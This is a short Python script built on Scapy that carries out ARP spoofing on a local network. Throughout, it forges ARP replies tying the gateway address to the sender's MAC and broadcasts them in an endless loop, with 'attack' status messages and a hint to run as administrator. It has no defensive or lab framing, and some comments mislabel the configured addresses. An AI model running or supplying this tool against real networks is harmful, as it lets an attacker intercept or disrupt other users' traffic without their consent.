from scapy.all import ARP, Ether, sendp, get_if_hwaddr, conf
import time

# --- CONFIGURATION ---
# The IP address of the local machine (attacker/scanner)
target_ip = "192.168.1.102" 

# The gateway IP address to be impersonated (spoofed)
spoof_ip = "192.168.1.1"
# ---------------------

try:
    # Gateway IP to impersonate (ARP spoofing target)
    my_mac = get_if_hwaddr(conf.iface)
    print(f"[*] Launching attack! Local MAC: {my_mac}")
    print(f"[*] Spoofing: {target_ip} now associates {spoof_ip} with my MAC.")

    # Create ARP reply packet with Ethernet header
    # Broadcast to all devices in the network (MAC: ff:ff:ff:ff:ff:ff)
    packet = Ether(src=my_mac, dst="ff:ff:ff:ff:ff:ff") / \
             ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)

    while True:
        sendp(packet, verbose=False)
        time.sleep(0.1) # Send packets at a rate of 10 per second
except Exception as e:
    print(f"ERROR: {e}")
    print("HINT: Run the terminal as ADMINISTRATOR!")
except KeyboardInterrupt:
    print("\n[!] Attack suspended.")